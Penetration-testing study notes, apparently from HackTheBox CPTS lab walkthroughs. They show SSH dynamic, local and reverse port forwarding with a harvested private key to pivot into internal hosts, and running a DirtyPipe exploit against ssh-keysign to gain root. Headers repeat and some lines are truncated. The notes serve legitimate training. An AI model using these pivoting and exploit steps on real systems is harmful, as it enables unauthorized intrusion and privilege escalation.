## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the
#cat/PIVOT/TUNNEL-PORTFW #cpts
Using the SSH private key harvested previously, students need to connect to `STMIP` over SSH but also use Dynamic Port Forwarding to set up for pivoting (using port 9050 in here equates to not editing "proxychains.conf"

```
sudo ssh -D 9050 -i id_rsa root@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ sudo ssh -D 9050 -i id_rsa root@10.129.203.114
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - find-a-backup-script-that-contains-the-password-for-the-backupadm-user
#cat/PIVOT/TUNNEL-PORTFW #cpts
Using the SSH private key harvested previously, students need to connect to `STMIP` (i.e., `DMZ01`) over SSH and set a local port forward to setup for RDP connection (students can choose the port number, 1337 is used her

```
ssh -i id_rsa -L PWNPO:172.16.8.20:3389 root@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ ssh -i id_rsa -L 1337:172.16.8.20:3389 root@10.129.97.1
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
Subsequently, students need to establish an additional SSH connection using Dynamic Port Forwarding so that `proxychains` can be used afterward:

```
ssh -i id_rsa -D 9050 root@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-4
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ ssh -i id_rsa -D 9050 root@10.129.203.114
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt-
#cat/PIVOT/TUNNEL-PORTFW #cpts
Utilizing the previously attained private key, students need to establish two SSH sessions into `DMZ01`, i.e., 172.16.8.3. One session with local port forwarding for `Win-RM`, and one session with reverse port forwarding

```
ssh -i id_rsa -L 5985:172.16.8.3:5985 root@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ ssh -i id_rsa -L 5985:172.16.8.3:5985 root@10.129.203.114
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--3
#cat/PIVOT/TUNNEL-PORTFW #cpts
For the reverse port forwarding session:

```
ssh -i id_rsa -R 1234:PWNIP:8443 root@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--4
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ ssh -i id_rsa -R 1234:10.10.15.8:8443 root@10.129.203.114
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-privileges-to-root-on-the-mgmt01-host-submit-the-contents-of-
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students now can execute the exploit and specify `/usr/lib/openssh/ssh-keysign` as the `SUID executable`, and at last, print out the flag file "flag.txt" under the root directory, to find its contents to be `206c03861986

```
./dirtypipe /usr/lib/openssh/ssh-keysign
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - voleur
#cat/PIVOT/TUNNEL-PORTFW #cpts
extrait du PDF Joplin: voleur

```
scp -i id_rsa -P 2222
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - pandora
#cat/PIVOT/TUNNEL-PORTFW #cpts
extrait du PDF Joplin: pandora

```
cat /etc/apache2/sites-enabled/pandora.conf We can port forward our connection to the remote host's internal port and then we will be able to access its web content. There are several ways to perform port forwarding, although we will be doing it by using the SSH connection itself. Using this tunnel, we can set up a proxy to view the webpage. Note : -D Specifies a local ''dynamic'' application-level port forwarding We will also need to configure a SOCKS proxy in the foxy-proxy browser extension in order to make the browser route the traffic through the port which is forwarded. When we visit our
```

